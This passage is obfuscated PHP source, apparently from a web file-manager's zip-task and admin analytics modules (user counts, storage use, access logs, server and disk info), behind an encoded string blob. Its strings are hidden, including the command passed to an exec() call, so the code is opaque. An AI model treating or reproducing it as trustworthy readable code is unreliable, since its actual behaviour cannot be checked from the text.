Ù^OS=ˆwŠçn')."\241\54\76\366\21\157\16\0\57\331\56\67\121\141\7\304\26\240\354\43\360\13\126\376\100\225\144\112\344\111\252\241\137\151\317\54\170\22\145\0\303\254\141\263\146\66\201\236\32"."\175\276\247\104\151\41\107\206\246\107\104\137\253\56\120\133\233\257\174\271\12\326\253\366\112\255\370\203\360\255\376\27\342\333\202\265\37\243\146\15\130\160\222\304\242\12\46\174\42".base64_decode('tzjk+rROHYqpKVFmF2ul/orlT7gKSRwOyeNlK3/AtghD503l4htJuVV607wxJPdYIg==')."\254\276\133\21\164\126\23\327\204\206\105\134\356\263\252\203\175\315\304\102\7\60\26\35\37\172\54\61\367\322\353\341\170\115\11\47\225\330\245\30\221\30\156\220\166\155\146\64\47"."\351\234\103\222\107\256\347\310\257\233\170\153\142\53\2\357\132\132\126\257\130\326\262\35\251\30\117\257\127\26\143\230\54\267\220\363\360\373\316\256\147\56\304\353\11\376\127\23\310"."\x69\x9e\x1e\xd0\x3d\xe7\x74\xb8\xc9\x95\x93\xa4\x8b\x4e\xc4\x6c\xe7\xbc\xcf\xb0\x90\x4c\x92\xcc\xfc\x99\x42\xb\xd2\x55\x9d\xf7\xa6\x94\xfb\x8a\xaf\xa1\x94\x55\x23\x2e\x65\x93\x5a\xcc\x4d\x1e\xfa"."\xc5\x86\x85\x31\xe1\x5\x83\x64\xd3\x4b\x88\x88\xf4\x88\xb8\xbf\x96\xf7\xbd\x79\xe9\x5e\x35\x4b\x30\x2f\x5a\x7b\x75\x26\x6e\xf4\x24\x3e\x83\x55\xc3\x27\x21\xb1\x5\xf8\xd2\xeb\x3d\x9f\x9e\xd7\x26"."\5\223\44\170\361\134\256\107\233\254\123\64\307\116\43\74\25\245\360\242\204\311\222\154\230\205\12\274\76\345\177\105\72\44\333\75\173\12\326\246\12\33\147\251\276\270\104\21\303"."\xc4\x69\xf5\x86\x4f\x16\x9a\xb7\xba\x6c\x43\xcd\x91\x4a\x24\xd1\x87\x34\xb8\xd6\x95\x74\xee\xc1\xa6\x1c\x42\x1d\x8b\xe\x85\x1f\xef\xc5\x27\xbd\x16\xdb\xbc\x18\x9f\x33\x54\x86\x18\xce\x4\x3d\xa9".base64_decode('vpMclqQwjsGX5cgvQHuvS2V5g4QCeikuNSdfpe6yQqr+RwRWekEsmbqLDLbVya14SA==')."\44\37\30\224\114\312\231\236\356\370\247\226\34\102\4\372\322\304\62\21\343\322\274\210\67\213\226\327\175\275\227\53\370\107\106\153\70\123\206\233\55\112\47\243\332\314\332\164\273"."\6\250\360\241\372\375\365\367\212\301\324\177\136\24\215\324\364\107\322\307\110\133\165\352\320\36\325\255\106\263\160\115\301\256\172\352\356\2\4\270\56\315\302\165\153\262\131\145\111"."\xbc\x22\xd5\x73\xb5\xaa\xb3\x8b\xe1\xd5\x2\xf\x64\xe\xb9\x3a\x3\xf6\x9d\xcc\x69\xd1\x5d\xc1\xb3\x6e\xe1\xda\xcf\x1\xc6\xf9\x4b\x13\x21\x45\xfd\x5e\x8\xd9\x82\xef\x5e\xbc\x5e\x2f\xea\x16\xde".base64_decode('ZS9Ead8uUI/Wspw61FUoSNTScZFXR12Dton3aNlNVp1sWfejvnZIsu7Sd7xqG750GQ==')."\60\340\145\225\106\230\76\27\72\51\226\214\161\241\311\306\264\320\33\75\364\275\152\216\233\26\337\63\162\102\313\20\153\110\107\154\77\40\153\132\363\342\251\131\225\34\327\326\125"."\x8a\xf\xe0\x73\x7d\xed\x9\xba\xa4\x31\xc9\xbf\x64\x4d\x40\x8f\x3c\x96\x6b\x64\x75\xaf\x77\x5c\xd9\x5b\x16\xcd\x67\x1f\x29\x49\xb2\x41\x9f\x58\x4e\x48\x19\x3c\x6a\x5\x75\x4\x57\x24\x89\x6\x43"."\x42\x42\x4e\xdb\x13\x63\x91\x70\xc2\x63\xc5\x41\xf9\x4\xb8\x58\xa0\x77\x92\x5d\xf8\xee\x9b\xdf\x46\x11\xcf\xae\x74\x5f\xa5\xd9\x29\xcb\x76\x3\x38\x2f\x6d\x55\xc8\x6f\xa7\xe5\xba\xe2\x8e\x9e\x1e"."\353\11\63\210\67\307\200\244\202\202\102\342\352\11\167\212\334\151\20\264\45\344\205\4\341\166\24\237\227\123\72\315\45\104\311\23\301\167\45\74\42\357\175\160\113\332\123\365\335"._kodDe('MnbPYPC5JL9EW7giEgPy/ekVo1DwK27g7YF/dFSphZL/TSVbZJQNMk0K/fdjQXmK9tY=').strrev('«¿Ñ7 k&©)I-I²kÙ¾¦ì‘:µ*H¬š©Ò¤Û˜Y­A4U€-Iú\\®,‰ô')."\xbc\x68\x5f\x24\x16\xaf\xc9\xc3\xfa\x4b\xfd\xaa\x70\x70\x46\xb3\x62\x3\xa4\x97\xe4\x12\x70\x57\xbd\x88\x75\xad\x14\x3d\x21\xd7\xcd\x42\x38\x5f\x29\x5a\x4c\xe6\xce\x2e\x2f\x52\x5a\x89\x9d\xd2\x25"."\333\121\275\54\74\333\211\72\246\221\35\27\302\75\115\142\336\35\346\202\222\7\274\17\35\371\324\4\31\222\102\103\130\367\250\37\332\116\126\40\25\373\252\347\153\235\63\322\342"."\xfe\x3c\xe4\xb9\x67\x97\xd2\xc9\x7a\x20\x4\x46\xc2\x39\x79\xa3\x25\x9\xb3\xea\x2\x48\x16\xec\xd6\x5e\x34\x90\x5c\x1\x0\xdc\xb1\x93\x2c\x50\x5c\x1b\xb3\x32\xd2\x45\x2\x3d\xc6\x80\x25\x27\x80".base64_decode('VNIvo2FPtqsV6l43U2keXvFCzvZ/AOYGqfFnrAAA').base64_decode('')."".""."".base64_decode('').strrev(''), 10, -8))); goto CãÜ…ÉÙÒø; b“²é‹Êğ†: class TaskZip extends TaskFileTransfer { protected function startAfter() { $š˜µé³é =& $_SERVER[şÒÁøÒÄ]; parent::startAfter(); Hook::bind($š˜µé³é[1796], array($this, $š˜µé³é[1791])); $’Ã¹¾¸ =& $this->task; $’Ã¹¾¸[$š˜µé³é[1793]] = $š˜µé³é[1207]; if (!$’Ã¹¾¸[$š˜µé³é[1580]]) { $’Ã¹¾¸[$š˜µé³é[1580]] = LNG($š˜µé³é[1797]); } } protected function endAfter() { $à­ªĞîÖ =& $_SERVER[şÒÁøÒÄ]; parent::endAfter(); Hook::unbind($à­ªĞîÖ[1796], array($this, $à­ªĞîÖ[1791])); } public function updateAfter() { $úà”“ê =& $_SERVER[şÒÁøÒÄ]; $ÙÑãé… =& $this->task; if (!$ÙÑãé…[$úà”“ê[794]] || !$ÙÑãé…[$úà”“ê[771]]) { return; } if ($ÙÑãé…[$úà”“ê[1793]] == $úà”“ê[1207]) { $•¤Áà×Ÿ = $ÙÑãé…[$úà”“ê[1734]]; if ($ÙÑãé…[$úà”“ê[1735]] != $úà”“ê[1207]) { $•¤Áà×Ÿ = 0; } $Ê…è‡æÙ = ($ÙÑãé…[$úà”“ê[1738]] + $•¤Áà×Ÿ) / $ÙÑãé…[$úà”“ê[771]]; $ÙÑãé…[$úà”“ê[1682]] = $Ê…è‡æÙ * 0.3; } else { if ($ÙÑãé…[$úà”“ê[1793]] == $úà”“ê[313]) { $Ê…è‡æÙ = $ÙÑãé…[$úà”“ê[1681]] / $ÙÑãé…[$úà”“ê[794]]; $ÙÑãé…[$úà”“ê[1682]] = 0.3 + $Ê…è‡æÙ * 0.5; } else { if ($ÙÑãé…[$úà”“ê[1793]] == $úà”“ê[107]) { $Ê…è‡æÙ = 0; if ($ÙÑãé…[$úà”“ê[1733]]) { $Ê…è‡æÙ = $ÙÑãé…[$úà”“ê[1734]] / $ÙÑãé…[$úà”“ê[1733]]; } $ÙÑãé…[$úà”“ê[1682]] = 0.3 + 0.5 + $Ê…è‡æÙ * 0.2; } } } if ($ÙÑãé…[$úà”“ê[1682]] > 0) { $ŸÓ˜û¦ = timeFloat() - $ÙÑãé…[$úà”“ê[1684]] - $ÙÑãé…[$úà”“ê[1687]]; $ÙÑãé…[$úà”“ê[1688]] = $ŸÓ˜û¦ * (1 - $ÙÑãé…[$úà”“ê[1682]]) / $ÙÑãé…[$úà”“ê[1682]]; } } public function copyFileStart($‘å·Ë¸, $«¼÷ú¡ø, $¿±Ã–á, $Û×¥ÆÈÇ, $æ‚ƒ˜ß, $·¹Şí¦²) { $«°íëàŞ =& $_SERVER[şÒÁøÒÄ]; parent::copyFileStart($‘å·Ë¸, $«¼÷ú¡ø, $¿±Ã–á, $Û×¥ÆÈÇ, $æ‚ƒ˜ß, $·¹Şí¦²); $ˆı·ú¬¶ =& $this->task; if ($ˆı·ú¬¶[$«°íëàŞ[1793]] == $«°íëàŞ[313]) { $ˆı·ú¬¶[$«°íëàŞ[1793]] = $«°íëàŞ[107]; } $this->update(); } public function copyFileEnd($œ±·„«û, $€à™¶Âö, $ŠÚãá±ä, $æíµ­¤ô, $€êØîø¦, $Ä²¼éİÚ) { $›Òş›­” =& $_SERVER[şÒÁøÒÄ]; $œğÇ°àË =& $this->task; $œğÇ°àË[$›Òş›­”[1734]] = $œğÇ°àË[$›Òş›­”[1733]]; $œğÇ°àË[$›Òş›­”[1738]] += $œğÇ°àË[$›Òş›­”[1733]]; $œğÇ°àË[$›Òş›­”[1735]] = $›Òş›­”[12]; $this->update(); } public function nameParse($¾¸‡÷™˜) { $òç‡ÉĞ =& $_SERVER[şÒÁøÒÄ]; $Û¨¦…—½ =& $this->task; if ($Û¨¦…—½[$òç‡ÉĞ[1681]] < $Û¨¦…—½[$òç‡ÉĞ[794]]) { $¿ˆ÷œÏË = get_path_this($¾¸‡÷™˜); if (strstr($¿ˆ÷œÏË, $òç‡ÉĞ[10])) { $Û¨¦…—½[$òç‡ÉĞ[1681]] += 1; } } if ($Û¨¦…—½[$òç‡ÉĞ[1793]] == $òç‡ÉĞ[1207]) { $Û¨¦…—½[$òç‡ÉĞ[1793]] = $òç‡ÉĞ[313]; } $Û¨¦…—½[$òç‡ÉĞ[1731]] = $¾¸‡÷™˜; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ÔàáçËŒ) { $¾ùÒ¦® =& $_SERVER[şÒÁøÒÄ]; $Şªš°¥ = array($¾ùÒ¦®[590] => array($¾ùÒ¦®[33] => $¾ùÒ¦®[1798], $¾ùÒ¦®[273] => array($¾ùÒ¦®[224], $¾ùÒ¦®[773], $¾ùÒ¦®[1799], $¾ùÒ¦®[1800])), $¾ùÒ¦®[1801] => array($¾ùÒ¦®[33] => $¾ùÒ¦®[1802], $¾ùÒ¦®[273] => array($¾ùÒ¦®[224], $¾ùÒ¦®[771], $¾ùÒ¦®[1803], $¾ùÒ¦®[1804], $¾ùÒ¦®[1805]))); if (!isset($Şªš°¥[$ÔàáçËŒ])) { return !1; } $this->optionType = $Şªš°¥[$ÔàáçËŒ][$¾ùÒ¦®[33]]; $this->field = $Şªš°¥[$ÔàáçËŒ][$¾ùÒ¦®[273]]; return !0; } public function listData($¯îæ˜ÉÓ = false, $èöÚˆÇ© = "\x6d\x6f\144\151\x66\171\124\x69\155\145", $£Ú¯Òà† = false) { return parent::listData($¯îæ˜ÉÓ, $èöÚˆÇ©, $£Ú¯Òà†); } public function trendList($ö‹Ê°öõ) { $“€†áÄ =& $_SERVER[şÒÁøÒÄ]; $Ä¢­¡Ïè = $this->listData(); if ($Ä¢­¡Ïè) { $ç‚íÌ = end($Ä¢­¡Ïè); $œäÉ¢Ê = date($“€†áÄ[1806], strtotime($“€†áÄ[1807])); if ($ç‚íÌ[$“€†áÄ[224]] == $œäÉ¢Ê) { return $Ä¢­¡Ïè; } $×ëû®Ø• = strtotime($ç‚íÌ[$“€†áÄ[224]]); } if (!isset($×ëû®Ø•)) { $ıîÇÂÓ = $ö‹Ê°öõ == $“€†áÄ[590] ? $“€†áÄ[525] : $“€†áÄ[833]; $×ëû®Ø• = Model($ıîÇÂÓ)->min($“€†áÄ[201]); } $§­–ô³ç = $“€†áÄ[1808] . ucfirst($ö‹Ê°öõ); $šçšª–µ = $this->dateList($×ëû®Ø•); foreach ($šçšª–µ as $œäÉ¢Ê) { $this->{$§­–ô³ç}($œäÉ¢Ê); } return $this->listData(); } private function dateList($Ä‘Úíç‡) { $ç÷£¼Áø =& $_SERVER[şÒÁøÒÄ]; $İ ¼Å»Ğ = $Ä‘Úíç‡; $ıÙàÍûö = strtotime($ç÷£¼Áø[1807]); $ÈÌ˜¬¨ = array(); while ($İ ¼Å»Ğ <= $ıÙàÍûö) { $ÈÌ˜¬¨[] = date($ç÷£¼Áø[1806], $İ ¼Å»Ğ); $İ ¼Å»Ğ = strtotime($ç÷£¼Áø[1809], $İ ¼Å»Ğ); } return $ÈÌ˜¬¨; } public function _recordUser($–âÆ·Š¿ = '') { $ƒƒ³—µ =& $_SERVER[şÒÁøÒÄ]; $ÊÌÃˆ×… = strtotime(date($ƒƒ³—µ[1810], strtotime($–âÆ·Š¿))); $‹°ìîÔí = strtotime(date($ƒƒ³—µ[1811], strtotime($–âÆ·Š¿))); $ÔÔÏ›ã˜ = array($ƒƒ³—µ[201] => array($ƒƒ³—µ[1026], $‹°ìîÔí)); $öØ‡ÀÀ = Model($ƒƒ³—µ[525])->where($ÔÔÏ›ã˜)->count($ƒƒ³—µ[1680]); $ÔÔÏ›ã˜[$ƒƒ³—µ[201]] = array($ƒƒ³—µ[333], array($ÊÌÃˆ×…, $‹°ìîÔí)); $ß‹Ê–“ = Model($ƒƒ³—µ[525])->where($ÔÔÏ›ã˜)->count($ƒƒ³—µ[1680]); $ÔÔÏ›ã˜[$ƒƒ³—µ[33]] = $ƒƒ³—µ[1812]; $ßô»«ÇÆ = Model($ƒƒ³—µ[1813])->where($ÔÔÏ›ã˜)->count($ƒƒ³—µ[1814]); $Ùó§îÀ… = array($ƒƒ³—µ[224] => $–âÆ·Š¿, $ƒƒ³—µ[773] => (int) $öØ‡ÀÀ, $ƒƒ³—µ[1799] => (int) $ß‹Ê–“, $ƒƒ³—µ[1800] => (int) $ßô»«ÇÆ); return $this->insert($Ùó§îÀ…); } public function _recordStore($â©ÎÈ = '') { $²½û´ =& $_SERVER[şÒÁøÒÄ]; $–ã“„òõ = strtotime(date($²½û´[1811], strtotime($â©ÎÈ))); $Øíí‡éñ = array($²½û´[201] => array($²½û´[1026], $–ã“„òõ)); $´Æ™˜êİ = Model($²½û´[471])->where($Øíí‡éñ)->sum($²½û´[76]); $Øíí‡éñ[$²½û´[410]] = 0; $†×áÂïû = Model($²½û´[833])->where($Øíí‡éñ)->sum($²½û´[76]); $Øíí‡éñ[$²½û´[411]] = 1; $‹ßÖÕ = Model($²½û´[833])->where($Øíí‡éñ)->sum($²½û´[76]); $Øíí‡éñ[$²½û´[411]] = 2; $ÏÙƒ…¡ = Model($²½û´[833])->where($Øíí‡éñ)->sum($²½û´[76]); $ãõŠÜ¼“ = array($²½û´[224] => $â©ÎÈ, $²½û´[771] => (int) $†×áÂïû, $²½û´[1803] => (int) $´Æ™˜êİ, $²½û´[1804] => (int) $‹ßÖÕ, $²½û´[1805] => (int) $ÏÙƒ…¡); return $this->insert($ãõŠÜ¼“); } public function trend($ôö¢»†ì, $ÛïõüÔü) { $éá¹¨ƒì =& $_SERVER[şÒÁøÒÄ]; if (!$this->init($ôö¢»†ì)) { return !1; } $íéƒŸÊû = $this->trendList($ôö¢»†ì); if ($íéƒŸÊû && $ÛïõüÔü != $éá¹¨ƒì[1653]) { $æëÁù®¼ = $íéƒŸÊû[0][$éá¹¨ƒì[224]]; $á€ÄÊİ = $this->validDate($ÛïõüÔü, $æëÁù®¼); $ŠôĞ½Ö = array(); $²Ó¶Ìš´ = array_to_keyvalue($íéƒŸÊû, $éá¹¨ƒì[224]); foreach ($á€ÄÊİ as $íìÅ™é×) { if (isset($²Ó¶Ìš´[$íìÅ™é×])) { $ƒîâ—ê‹ = $²Ó¶Ìš´[$íìÅ™é×]; } else { $ƒîâ—ê‹ = end($íéƒŸÊû); $ƒîâ—ê‹[$éá¹¨ƒì[224]] = $íìÅ™é×; if ($ôö¢»†ì == $éá¹¨ƒì[590]) { $ƒîâ—ê‹[$éá¹¨ƒì[1799]] = $ƒîâ—ê‹[$éá¹¨ƒì[1800]] = 0; } } $ŠôĞ½Ö[] = $ƒîâ—ê‹; } $íéƒŸÊû = $ŠôĞ½Ö; } $–¸ƒ Û¼ = array($éá¹¨ƒì[590] => array($éá¹¨ƒì[773] => LNG($éá¹¨ƒì[1815]), $éá¹¨ƒì[1799] => LNG($éá¹¨ƒì[1816]), $éá¹¨ƒì[1800] => LNG($éá¹¨ƒì[1817])), $éá¹¨ƒì[1801] => array($éá¹¨ƒì[771] => LNG($éá¹¨ƒì[1818]), $éá¹¨ƒì[1803] => LNG($éá¹¨ƒì[1819]), $éá¹¨ƒì[1804] => LNG($éá¹¨ƒì[1820]), $éá¹¨ƒì[1805] => LNG($éá¹¨ƒì[1821]))); $Š¿Ãß© = array($éá¹¨ƒì[590] => $éá¹¨ƒì[1822], $éá¹¨ƒì[1801] => $éá¹¨ƒì[76]); if (empty($íéƒŸÊû)) { $íìÅ™é× = date($éá¹¨ƒì[1806], strtotime($éá¹¨ƒì[1807])); $ßıÉúä¤ = array($éá¹¨ƒì[224] => $íìÅ™é×); foreach ($–¸ƒ Û¼[$ôö¢»†ì] as $‘ú™Œƒ‡ => $Ã†¤÷í) { $ßıÉúä¤[$‘ú™Œƒ‡] = 0; } $íéƒŸÊû[] = $ßıÉúä¤; } $Ş³Øá²á = array(); foreach ($íéƒŸÊû as $Ã†¤÷í) { if ($ôö¢»†ì == $éá¹¨ƒì[1801] && $Ã†¤÷í[$éá¹¨ƒì[1803]] > $Ã†¤÷í[$éá¹¨ƒì[771]]) { $Ã†¤÷í[$éá¹¨ƒì[1803]] = $Ã†¤÷í[$éá¹¨ƒì[771]]; } foreach ($–¸ƒ Û¼[$ôö¢»†ì] as $‘ú™Œƒ‡ => $‰„¡²Ä…) { $ƒîâ—ê‹ = array($éá¹¨ƒì[224] => $Ã†¤÷í[$éá¹¨ƒì[224]], $éá¹¨ƒì[1580] => $‰„¡²Ä…); $ƒîâ—ê‹[$Š¿Ãß©[$ôö¢»†ì]] = isset($Ã†¤÷í[$‘ú™Œƒ‡]) ? $Ã†¤÷í[$‘ú™Œƒ‡] : 0; $Ş³Øá²á[] = $ƒîâ—ê‹; } } return $Ş³Øá²á; } public function validDate($ÚÁğ¤, $›ŠÊôÒ’) { $ »øœûœ =& $_SERVER[şÒÁøÒÄ]; $Û©æÄ = date($ »øœûœ[1806], strtotime($ »øœûœ[1807])); $˜›”×Âé = array($Û©æÄ); switch ($ÚÁğ¤) { case $ »øœûœ[1660]: $ÛˆÛø’ = mktime(0, 0, 0, date($ »øœûœ[1823]), date($ »øœûœ[1402]) - date($ »øœûœ[1465]) + 7 - 7, date($ »øœûœ[1824])); $»‰ùø¡« = 0; do { $íøˆĞ°Ç = date($ »øœûœ[1806], $ÛˆÛø’ - 3600 * 24 * 7 * $»‰ùø¡«); $˜›”×Âé[] = $íøˆĞ°Ç; $»‰ùø¡«++; } while ($›ŠÊôÒ’ < $íøˆĞ°Ç); break; case $ »øœûœ[1658]: $»‰ùø¡« = 1; do { $şÍ®Ÿ–æ = date($ »øœûœ[1825], strtotime("\x2d\40{$»‰ùø¡«}\40\x6d\157\156\x74\x68\163")); $˜›”×Âé[] = $şÍ®Ÿ–æ; $»‰ùø¡«++; } while ($›ŠÊôÒ’ < $şÍ®Ÿ–æ); break; case $ »øœûœ[1826]: $š÷¹Ø™‘ = (int) date($ »øœûœ[1824], strtotime($›ŠÊôÒ’)); $ğƒºìÌî = (int) date($ »øœûœ[1824]); if ($š÷¹Ø™‘ >= $ğƒºìÌî) { break; } for ($š÷¹Ø™‘; $š÷¹Ø™‘ < $ğƒºìÌî; $š÷¹Ø™‘++) { $˜›”×Âé[] = $š÷¹Ø™‘ . $ »øœûœ[1827]; } break; default: break; } if ($›ŠÊôÒ’ > end($˜›”×Âé)) { array_pop($˜›”×Âé); } sort($˜›”×Âé); return $˜›”×Âé; } public function listTable($¤îÀÍ­) { $´ÔÁÄğË = ucfirst($¤îÀÍ­); return Model($´ÔÁÄğË)->listData(); } public function option($¯ÆÚ®†ç) { $ŞÃÎ÷ÕÉ = $_SERVER[şÒÁøÒÄ][1828] . ucfirst($¯ÆÚ®†ç); return $this->{$ŞÃÎ÷ÕÉ}(); } private function optionUser() { $Á Ñàª® =& $_SERVER[şÒÁøÒÄ]; $æá‘ë½˜ = Model($Á Ñàª®[525])->count($Á Ñàª®[1680]); $÷µƒÇå¬ = Model($Á Ñàª®[525])->where($Á Ñàª®[1829])->count($Á Ñàª®[1680]); $¼•»Ôß¤ = intval($GLOBALS[$Á Ñàª®[6]][$Á Ñàª®[349]][$Á Ñàª®[1635]]) / 3600; $ÑØË¹ƒˆ = strtotime("\55{$¼•»Ôß¤}\40\150\157\x75\162\x73"); $ëÉ‰ôöÌ = strtotime(date($Á Ñàª®[1810])); if ($ÑØË¹ƒˆ < $ëÉ‰ôöÌ) { $ÑØË¹ƒˆ = $ëÉ‰ôöÌ; } $°Ü‹õ = array($Á Ñàª®[1830] => array($Á Ñàª®[1027], $ÑØË¹ƒˆ)); $„©‡®™í = (int) Model($Á Ñàª®[525])->where($°Ü‹õ)->count($Á Ñàª®[1680]); if (!$„©‡®™í) { $„©‡®™í = 1; } $°Ü‹õ = array($Á Ñàª®[1830] => array($Á Ñàª®[1027], $ëÉ‰ôöÌ)); $ë•ğ¤ş = Model($Á Ñàª®[525])->where($°Ü‹õ)->count($Á Ñàª®[1680]); return array($Á Ñàª®[766] => (int) $æá‘ë½˜, $Á Ñàª®[1831] => (int) ($æá‘ë½˜ - $÷µƒÇå¬), $Á Ñàª®[1832] => (int) $÷µƒÇå¬, $Á Ñàª®[1833] => (int) $ë•ğ¤ş, $Á Ñàª®[1834] => $„©‡®™í); } private function optionFile() { $› Ÿ¾ı =& $_SERVER[şÒÁøÒÄ]; $ÓÖ£Ïú€ = $this->sourceSize(); $æ°ä·Õ = $ÓÖ£Ïú€[$› Ÿ¾ı[76]]; $şÔ°ÓÈ¡ = $ÓÖ£Ïú€[$› Ÿ¾ı[1803]]; $Ñ¤¦º›è = Model($› Ÿ¾ı[833])->where(array($› Ÿ¾ı[410] => 0))->count($› Ÿ¾ı[402]); $à¼Ë¥¯» = array($› Ÿ¾ı[410] => 0, $› Ÿ¾ı[201] => array($› Ÿ¾ı[1027], strtotime(date($› Ÿ¾ı[1810])))); $®“ —– = Model($› Ÿ¾ı[833])->where($à¼Ë¥¯»)->sum($› Ÿ¾ı[76]); $ÜáÉäš = Model($› Ÿ¾ı[833])->where($à¼Ë¥¯»)->count($› Ÿ¾ı[402]); return array($› Ÿ¾ı[771] => $æ°ä·Õ, $› Ÿ¾ı[1803] => $şÔ°ÓÈ¡, $› Ÿ¾ı[1835] => $æ°ä·Õ - $şÔ°ÓÈ¡, $› Ÿ¾ı[1836] => (int) $®“ —–, $› Ÿ¾ı[773] => (int) $Ñ¤¦º›è, $› Ÿ¾ı[1837] => (int) $ÜáÉäš); } private function optionAccess() { $˜ñ â¤í =& $_SERVER[şÒÁøÒÄ]; return array($˜ñ â¤í[766] => $this->typeLogCnt(), $˜ñ â¤í[107] => $this->typeLogCnt($˜ñ â¤í[107]), $˜ñ â¤í[452] => $this->typeLogCnt($˜ñ â¤í[452]), $˜ñ â¤í[1838] => $this->typeLogCnt($˜ñ â¤í[1838]), $˜ñ â¤í[1839] => $this->typeLogCnt($˜ñ â¤í[1839]), $˜ñ â¤í[590] => $this->typeLogCnt($˜ñ â¤í[12], $˜ñ â¤í[1814])); } private function typeLogCnt($µªöØÇÂ = '', $çµÑ…œÈ = "\151\144") { $–ª‡Í¥µ =& $_SERVER[şÒÁøÒÄ]; $ÂŠ§§óæ = array($–ª‡Í¥µ[107] => array($–ª‡Í¥µ[1840], $–ª‡Í¥µ[1841]), $–ª‡Í¥µ[452] => array($–ª‡Í¥µ[1842], $–ª‡Í¥µ[1843]), $–ª‡Í¥µ[1838] => array($–ª‡Í¥µ[1844], $–ª‡Í¥µ[1845], $–ª‡Í¥µ[1846]), $–ª‡Í¥µ[1839] => array($–ª‡Í¥µ[1847], $–ª‡Í¥µ[1848]), $–ª‡Í¥µ[1849] => array($–ª‡Í¥µ[1850], $–ª‡Í¥µ[1851], $–ª‡Í¥µ[1852])); $‹¿şË­ = strtotime(date($–ª‡Í¥µ[1810])); $·şã±Ï = array($–ª‡Í¥µ[201] => array($–ª‡Í¥µ[1027], $‹¿şË­)); if ($µªöØÇÂ) { $·şã±Ï[$–ª‡Í¥µ[33]] = array($–ª‡Í¥µ[7], $ÂŠ§§óæ[$µªöØÇÂ]); } $”œÃî¤Ê = Model($–ª‡Í¥µ[1813])->where($·şã±Ï)->count($çµÑ…œÈ); return (int) $”œÃî¤Ê; } private function optionServer() { $ÀøŠñ¿ =& $_SERVER[şÒÁøÒÄ]; $ƒ¾’´ø¾ = $this->diskDriver(); $ÃÂ·äÍ = KodIO::defaultDriver(); $²‚½üı = array($ÀøŠñ¿[825] => $ÃÂ·äÍ[$ÀøŠñ¿[399]]); $ñ­ªÉÇ = Model($ÀøŠñ¿[471])->where($²‚½üı)->sum($ÀøŠñ¿[76]); $ÈŸÕ‚“× = explode($ÀøŠñ¿[53], $_SERVER[$ÀøŠñ¿[143]]); $ƒÕ¿ĞÑ› = $ÈŸÕ‚“×[0]; $‰÷“§»Ì = $GLOBALS[$ÀøŠñ¿[6]][$ÀøŠñ¿[21]]; $¸›Ñ¦â = $‰÷“§»Ì[$ÀøŠñ¿[989]]; if ($¸›Ñ¦â == $ÀøŠñ¿[977]) { $ñÜ· = explode($ÀøŠñ¿[1292], $‰÷“§»Ì[$ÀøŠñ¿[988]]); $¸›Ñ¦â = $ñÜ·[0]; } if ($¸›Ñ¦â == $ÀøŠñ¿[925] || $¸›Ñ¦â == $ÀøŠñ¿[812]) { $Áğ¶¡ú = Model()->db()->query($ÀøŠñ¿[1853]); $§»à¯÷ = $Áğ¶¡ú[0] && isset($Áğ¶¡ú[0][$ÀøŠñ¿[1579]]) ? $Áğ¶¡ú[0][$ÀøŠñ¿[1579]] : 0; $¸›Ñ¦â = $ÀøŠñ¿[1854] . ($§»à¯÷ ? $ÀøŠñ¿[8] . $§»à¯÷ : $ÀøŠñ¿[12]); } $‘Ôˆ•º = $GLOBALS[$ÀøŠñ¿[6]][$ÀøŠñ¿[349]][$ÀøŠñ¿[835]]; return array($ÀøŠñ¿[1855] => $ƒ¾’´ø¾ ? $ƒ¾’´ø¾[$ÀøŠñ¿[1856]] : 0, $ÀøŠñ¿[1857] => $ƒ¾’´ø¾ ? $ƒ¾’´ø¾[$ÀøŠñ¿[1858]] : 0, $ÀøŠñ¿[1859] => (int) $ÃÂ·äÍ[$ÀøŠñ¿[1856]] * 1024 * 1024 * 1024, $ÀøŠñ¿[1860] => (int) $ñ­ªÉÇ, $ÀøŠñ¿[1861] => ucfirst($ƒÕ¿ĞÑ›), $ÀøŠñ¿[1862] => $ÀøŠñ¿[1863] . PHP_VERSION, $ÀøŠñ¿[1864] => phpBuild64() ? 64 : 32, $ÀøŠñ¿[765] => str_replace($ÀøŠñ¿[1143], $ÀøŠñ¿[1005], $¸›Ñ¦â), $ÀøŠñ¿[349] => ucfirst($‘Ôˆ•º), $ÀøŠñ¿[32] => $_SERVER[$ÀøŠñ¿[1865]]); } private function diskDriver() { $âş‹³œ =& $_SERVER[şÒÁøÒÄ]; $ËòÙ±œ­ = $âş‹³œ[8]; $î“óšŠ® = $GLOBALS[$âş‹³œ[6]][$âş‹³œ[1309]] == $âş‹³œ[1310]; if ($î“óšŠ®) { $ËòÙ±œ­ = $âş‹³œ[1866]; if (function_exists($âş‹³œ[1867])) { exec($âş‹³œ[1868], $Ó»ê˜ò¥); $ËòÙ±œ­ = $Ó»ê˜ò¥[1] . $âş‹³œ[8]; } } if (!file_exists($ËòÙ±œ­)) { return; } $¾ğÁÆï¹ = @disk_total_space($ËòÙ±œ­); $„ûãÇö… = $¾ğÁÆï¹ - @disk_free_space($ËòÙ±œ­); return array($âş‹³œ[1856] => $¾ğÁÆï¹, $âş‹³œ[1858] => $„ûãÇö…); } public function fileChart($¸ïÛàü) { $öíÙ½Ì =& $_SERVER[şÒÁøÒÄ]; if (isset($¸ïÛàü[$öíÙ½Ì[1680]])) { return Model($öíÙ½Ì[833])->userFileTypeProfile($¸ïÛàü[$öíÙ½Ì[1680]]); } if (isset($¸ïÛàü[$öíÙ½Ì[1869]])) { return Model($öíÙ½Ì[833])->groupFileTypeProfile($¸ïÛàü[$öíÙ½Ì[1869]]); } $¾Û¬Ãì› = $this->sourceSize(); $’û´»šë = array($öíÙ½Ì[432] => 0, $öíÙ½Ì[411] => 1); $ïî ¹•  = Model($öíÙ½Ì[833])->where($’û´»šë)->sum($öíÙ½Ì[76]); $’û´»šë[$öíÙ½Ì[411]] = 2; $Œ ‹¡ŒÖ = Model($öíÙ½Ì[833])->where($’û´»šë)->sum($öíÙ½Ì[76]); return array($öíÙ½Ì[771] => $¾Û¬Ãì›[$öíÙ½Ì[76]], $öíÙ½Ì[1803] => $¾Û¬Ãì›[$öíÙ½Ì[1803]], $öíÙ½Ì[1804] => (int) $ïî ¹• , $öíÙ½Ì[1805] => (int) $Œ ‹¡ŒÖ); } private function sourceSize() { $À¶‚ =& $_SERVER[şÒÁøÒÄ]; $¶©ĞÏÊ· = Model($À¶‚[833])->where(array($À¶‚[410] => 0))->sum($À¶‚[76]); $™Äå¯šÁ = Model($À¶‚[471])->sum($À¶‚[76]); if ($™Äå¯šÁ > $¶©ĞÏÊ·) { $™Äå¯šÁ = $¶©ĞÏÊ·; } return array($À¶‚[76] => (int) $¶©ĞÏÊ·, $À¶‚[1803] => (int) 